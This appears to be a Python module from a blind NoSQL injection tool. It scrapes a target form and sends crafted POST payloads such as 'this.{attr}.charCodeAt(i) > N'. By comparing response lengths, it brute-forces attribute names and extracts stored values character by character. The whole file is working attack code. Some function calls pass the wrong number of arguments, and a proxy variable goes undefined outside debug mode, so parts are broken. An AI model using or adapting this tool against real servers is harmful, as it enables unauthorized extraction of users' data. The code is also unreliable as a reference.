import random
import string
from bs4 import BeautifulSoup
import requests
from urllib.parse import quote, urlparse
import sys
from objects import *


def progress_bar(progress, total, bar_length=40):
    percent = float(progress) / total
    arrow = '=' * int(round(percent * bar_length) - 1) + '>'
    spaces = ' ' * (bar_length - len(arrow))
    
    sys.stdout.write(f"\rProgress: [{arrow}{spaces}] {int(percent * 100)}%")
    sys.stdout.flush()

def replace_param_value(parameters, request_body_type, param_name):
    
    if request_body_type == PostRequestBodyType.FORM_URLENCODED:
        
        # Split the query string into individual parameters
        params = parameters.split('&')
        
        # Iterate through the parameters and replace the value of the specified param_name
        updated_params = []
        for param in params:
            key, value = param.split('=') if '=' in param else (param, None)  # Split into key and value
            if key == param_name:
                updated_params.append(f"{key}=§{param_name}§")  # Replace value with §param_name§
            else:
                updated_params.append(param)  # Keep the original parameter unchanged

        # Join the updated parameters back into a query string
        return '&'.join(updated_params)
    elif request_body_type == PostRequestBodyType.JSON:
        if not isinstance(parameters, dict):
            raise Exception("Encountered JSON request_body_type but parameters are not in valid JSON format")
        
        if not param_name in parameters.keys():
            raise Exception("Could not insert placeholder: Key {param_name} does not exist in JSON")
        
        parameters[param_name] = f"§{param_name}§"
        return parameters
                
    else:
        raise Exception(f"The request_body_type '{request_body_type}' can not be handled in this version.")

def extract_form_data(url, scan_param_name):
    print(f"[+] Extracting form data from {url}")

    # Send HTTP request to the page
    response = requests.get(url)
    if not response or response.status_code != 200:
        print("[-] Error: Unable to fetch page.")
        exit()

    # Use BeautifulSoup to parse the HTML page
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the first form on the page
    form = soup.find('form')
    if not form:
        print("[-] Error: No form found on the page.")
        exit()

    # prepare attack target url
    parsed_url = urlparse(url)
    
    # Initialize AttackTarget object
    attack_target = AttackTarget(
        http_verb=form.get('method', '').upper(),
        http_schema=parsed_url.scheme,
        host = parsed_url.netloc,
        path=form.get('action', ''),
        request_body_type=PostRequestBodyType.FORM_URLENCODED
    )

    if not attack_target.method:
        print("[-] Error: No method extracted...")
        exit()


    # Extract input fields from the form
    for input_tag in form.find_all('input'):
        name = input_tag.get('name', '')
        if name:
            if name == scan_param_name:
                attack_target.parameters += f"{name}=§{scan_param_name}§&"
            else:
                attack_target.parameters += f"{name}=x&"

    # Handle button fields similarly
    for button in form.find_all('button', attrs={'type': 'submit'}):
        name = button.get('name', '')
        if name:
            if name == scan_param_name:
                attack_target.parameters += f"{name}=§{scan_param_name}§&"
            else:
                attack_target.parameters += f"{name}=x&"

    # Cleanup trailing '&' and set param count
    attack_target.parameters = attack_target.parameters.rstrip("&")
    return attack_target

def get_baseline_response(attack_target,debug=False):
    # get default response for random payload
    default_response = get_random_payload_response(attack_target,debug=debug)
    # check if page is dynamic
    default_response_2 = get_random_payload_response(attack_target,debug=debug)

    if len(default_response.text) == len(default_response_2.text):
        print("[+] Form target page is not reflective")
        return default_response
    else:
        print("[-] Page content is reflective")
        print("[-] You need to specify a fail or success string.")
        exit()

def check_successfull_http_schema(url):
    protocols = ["https://", "http://"]
    
    for protocol in protocols:
        full_url = protocol + url
        
        # Versuche zuerst mit einer HEAD-Anfrage
        try:            
            response = requests.head(full_url, timeout=5)
            if response:
                return protocol
        except requests.RequestException:
            pass
        
    # Wenn beide HEAD-Anfragen fehlschlagen, versuche GET-Anfragen
    for protocol in protocols:
        full_url = protocol + url
        
        try:            
            # Fallback zu einer GET-Anfrage, falls beide HEAD fehlschlagen
            response = requests.get(full_url, timeout=5)            
            if response:
                return protocol
        except requests.RequestException:
            pass
    
    # Weder HTTPS noch HTTP war erfolgreich
    return None

def check_and_correct_url_schema(url):
    if not url:
        return None
    
    # check if HTTP schema exists
    if url.startswith("http"):
       return url
    else:
        # find schema
        print("[!] No URL schema supplied. Automatically checking successfull HTTP schema...")
        schema = check_successfull_http_schema(url)
        if schema:
            print(f"[+] Automatically found HTTP schema: {schema}")
            return schema + url
        else:
            raise Exception(f"Target URL {url} is not responsive for HEAD and GET requests.")
        

def generate_random_string(length):
    # Define the character set (uppercase, lowercase, digits)
    characters = string.ascii_letters + string.digits
    # Use random.choices to generate a random string
    random_string = ''.join(random.choices(characters, k=length))
    return random_string

def get_random_payload_response(attack_target,debug=False):        
    default_response = send_post_request(attack_target, generate_random_string(8),debug=debug)
    if not default_response:
        raise Exception(f"Default Response failed: {default_response.status_code}, {default_response.text}")
    return default_response


def print_results(found_attributes, results):
    print("Extracted attributes:")
    for attr, length in found_attributes:
        print(f"[+]  {attr}:{length}")
    print("Extracted data:")
    for r in results:
        print(f"[+] {r[0]}:{r[1]}")

def send_extraction_request(attack_target, extraction_point, extraction_payload,debug = False):
    # create payload by replacing injection point 
    payload = extraction_point.replace("§inject§", extraction_payload)        
    response = send_post_request(attack_target, payload,debug=debug)
    if response == None:
        raise Exception("Extraction response is None")
    res = len(response.text) != len(attack_target.baseline_response)
    if debug:
        print(attack_target.get_target_url(), payload, res)
    return res

def send_post_request(attack_target, payload, debug = False):
    r_body_type = attack_target.request_body_type
    if debug:
        proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",  # HTTPS Requests ebenfalls durch Burp leiten
        }
    if r_body_type == PostRequestBodyType.JSON:
        r_data = attack_target.parameters.copy()
        r_data[attack_target.scan_param_name] = payload
        
        if debug:
            print(attack_target.get_target_url(), r_data)
            print(attack_target.headers)
        r = requests.post(
            attack_target.get_target_url(),
            headers=attack_target.headers,
            cookies=attack_target.cookies,
            json=r_data,proxies=proxies
        )    
    
    elif r_body_type == PostRequestBodyType.FORM_URLENCODED:
        r_data = attack_target.parameters.replace(f"§{attack_target.scan_param_name}§", quote(payload))
        if debug:
            print(attack_target.get_target_url(), r_data)
            print(attack_target.headers)
        r = requests.post(
            attack_target.get_target_url(),
            headers=attack_target.headers,
            cookies=attack_target.cookies,
            data=r_data,proxies=proxies
        )    
    else:
        raise Exception(f"The request_body_type '{r_body_type}' can not be handled in this version.")
    
    
    if r and debug:
        print(len(r.text), r.status_code, r.text)
    return r

def brute_attribute_names(attack_target, extraction_point):
    print(f"Brute Forcing attributes ...")
    # Brute Attributes
    with open("attributes.txt") as file:
        attributes_list = set(l.strip() for l in file.readlines())
    if not attributes_list:
        print("Attributes list attributes.txt could not be found")
        exit()
    attributes_list.add(attack_target.scan_param_name)
    found_attributes = []    
    for a in attributes_list:       
        extraction_payload = f'this.{a} != undefined'        
        if send_extraction_request(attack_target, extraction_point, extraction_payload, attack_target.scan_param_name, attack_target.baseline_response):            
            attr_length = get_extraction_parameter_length(attack_target,attack_target.scan_param_name, attack_target.baseline_response, extraction_point, a)
            if attr_length:
                found_attributes.append([a,attr_length])
                print(f"\t[+] Found attribute: {a} with length {attr_length}")
    return found_attributes

def get_extraction_parameter_length(attack_target,insertion_param_name, default_response, extraction_point, extraction_attribute_name):    
    low = 1 
    high = 1000 
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Caluclate the midpoint of the search area
        
        # test if length is bigger than mid
        extraction_payload = f'this.{extraction_attribute_name}.length > {mid}'    
        if send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response):
            low = mid + 1 
            continue
        
        # test if length is smaller than mid
        extraction_payload = f'this.{extraction_attribute_name}.length < {mid}'    
        if send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response):
            high = mid - 1
            continue
        
        # length should be found
        extraction_payload = f'this.{extraction_attribute_name}.length = {mid}'    
        if send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response):                          
            return mid  

def brute_extract_data(attack_target,scan_param_name, default_response, extraction_point, extraction_attribute_name, extraction_attribute_length):
    print(f"Brute forcing: {extraction_attribute_name} ...")
    result= ""
    for i in range(extraction_attribute_length):
        new_found = False
        low = 32 # Set low value of search area (' ')
        high = 127 # Set high value of search area ('~')
        mid = 0
        while low <= high:
            mid = (high + low) // 2 # Caluclate the midpoint of the search area
            
            # test if length is bigger than mid
            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) > {mid}'    
            if send_extraction_request(attack_target, extraction_point, extraction_payload, scan_param_name, default_response):
                low = mid + 1 
                continue
            
            # test if length is smaller than mid
            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) < {mid}'   
            if send_extraction_request(attack_target, extraction_point, extraction_payload, scan_param_name, default_response):
                high = mid - 1
                continue
            
            # length should be found
            result += chr(mid)              
            new_found = True
            progress_bar(i, extraction_attribute_length)
            break

        if not new_found:
            raise Exception(f"No new char could be found for: {extraction_attribute_name} at index {i} (max length: {extraction_attribute_length})")                                 
    progress_bar(extraction_attribute_length, extraction_attribute_length)
    print()
    return result

def remove_char_at_index(s, index):
    if index < 0 or index >= len(s):
        raise IndexError("Index out of range")
    return s[:index] + s[index + 1:]
